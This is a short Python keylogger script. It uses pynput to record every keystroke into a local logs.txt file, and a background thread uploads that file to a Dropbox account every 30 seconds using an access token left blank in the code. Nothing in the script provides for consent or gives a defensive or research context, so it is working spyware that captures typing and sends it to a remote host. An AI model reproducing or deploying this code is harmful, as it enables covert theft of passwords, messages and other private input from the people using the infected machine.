import pynput
from pynput.keyboard import Key, Listener
import os
import dropbox
import time
import threading

access_token = ''

filename = f"{os.getcwd()}\logs.txt" #File On C:/Users/WindowsName or C:/Users/Admin
if (os.path.exists(filename) == False):
    f = open(filename, "w")
else:
    print("File Exists")

keys = []

def main():
    thread2 = threading.Thread(target=upload_file, args=())
    thread2.start()

    with Listener(on_press = on_press) as listener:              
        listener.join()
  
def on_press(key):
     
    keys.append(key)
    write_file(keys)
     
    #try:
        #print('alphanumeric key {0} pressed'.format(key.char))
         
    #except AttributeError:
        #print('special key {0} pressed'.format(key))
          
def write_file(keys):
     
    with open("logs.txt", 'w') as f:
        for key in keys:
             
            # removing ''
            ctrlReplace = str(key).replace("Key.ctrl_l", " Key.ctrl_l ").replace("Key.ctrl_r", " Key.ctrl_r ")
            shiftReplace = str(ctrlReplace).replace("Key.shift", " Key.shift ").replace("Key.shift_r", " Key.shift_r ")
            altReplace = str(shiftReplace).replace("Key.alt_l", " Key.alt_l ").replace("Key.alt_r", " Key.alt_r ")
            k = str(altReplace).replace("'", "").replace("Key.space", " ").replace("Key.tab", " Key.tab ").replace("Key.caps_lock", " Key.caps_lock ").replace("Key.enter", " Key.enter ")
            f.write(k)

            f.write('')

def upload_file():
    while True:
        time.sleep(30)
        dbx = dropbox.Dropbox(access_token)
        f = open(filename, 'rb')
        dbx.files_upload(f.read(), "/Apps/YourAppName/log.txt")
        print("File Uploaded")

def test():
    while True:
        time.sleep(30)
        print("tick")
        

main()


